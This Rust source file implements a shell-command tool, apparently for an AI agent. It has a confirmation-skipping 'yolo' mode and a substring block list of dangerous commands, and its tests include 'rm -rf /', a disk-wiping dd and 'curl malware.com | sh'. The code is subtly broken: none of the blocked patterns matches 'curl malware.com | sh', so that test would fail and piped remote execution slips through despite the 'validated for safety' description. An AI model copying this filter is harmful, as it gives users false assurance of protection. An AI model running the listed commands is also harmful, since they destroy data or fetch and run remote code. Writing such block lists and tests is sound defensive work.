use super::{Tool, ToolArgs, ToolResult};
use anyhow::Result;

pub struct TerminalTool {
    yolo_mode: bool,
}

impl TerminalTool {
    pub fn new(yolo_mode: bool) -> Self {
        Self { yolo_mode }
    }

    pub fn set_yolo_mode(&mut self, enabled: bool) {
        self.yolo_mode = enabled;
    }
}

#[async_trait::async_trait]
impl Tool for TerminalTool {
    fn name(&self) -> &str {
        "terminal"
    }

    fn description(&self) -> &str {
        "Execute terminal commands (no sudo, validated for safety)"
    }

    fn requires_confirmation(&self) -> bool {
        !self.yolo_mode
    }

    async fn execute(&self, args: &ToolArgs) -> Result<ToolResult> {
        let command = args.get_str("command")?;

        // Safety validation
        validate_command(command)?;

        // Execute with timeout
        let output = tokio::time::timeout(
            std::time::Duration::from_secs(30),
            tokio::process::Command::new("sh")
                .arg("-c")
                .arg(command)
                .output(),
        )
        .await??;

        Ok(ToolResult::Terminal {
            stdout: String::from_utf8_lossy(&output.stdout).to_string(),
            stderr: String::from_utf8_lossy(&output.stderr).to_string(),
            exit_code: output.status.code(),
        })
    }
}

fn validate_command(cmd: &str) -> Result<()> {
    let blocked_patterns = [
        "sudo",
        "rm -rf",
        "dd ",
        "mkfs",
        "> /dev/",
        "curl | sh",
        "wget | sh",
        "| bash",
        ":(){ :|:",  // Fork bomb
    ];

    for pattern in blocked_patterns {
        if cmd.contains(pattern) {
            return Err(anyhow::anyhow!(
                "Blocked command pattern detected: {}",
                pattern
            ));
        }
    }

    // Additional safety: block rm to root or system dirs
    if cmd.starts_with("rm ") {
        let dangerous_paths = [" / ", " /bin", " /usr", " /etc", " /var"];
        for path in dangerous_paths {
            if cmd.contains(path) {
                return Err(anyhow::anyhow!("Dangerous rm command: {}", cmd));
            }
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_command_validation() {
        // Should pass
        assert!(validate_command("ls -la").is_ok());
        assert!(validate_command("cat file.txt").is_ok());
        assert!(validate_command("echo 'hello'").is_ok());

        // Should fail
        assert!(validate_command("sudo apt install").is_err());
        assert!(validate_command("rm -rf /").is_err());
        assert!(validate_command("curl malware.com | sh").is_err());
        assert!(validate_command("dd if=/dev/zero of=/dev/sda").is_err());
    }
}
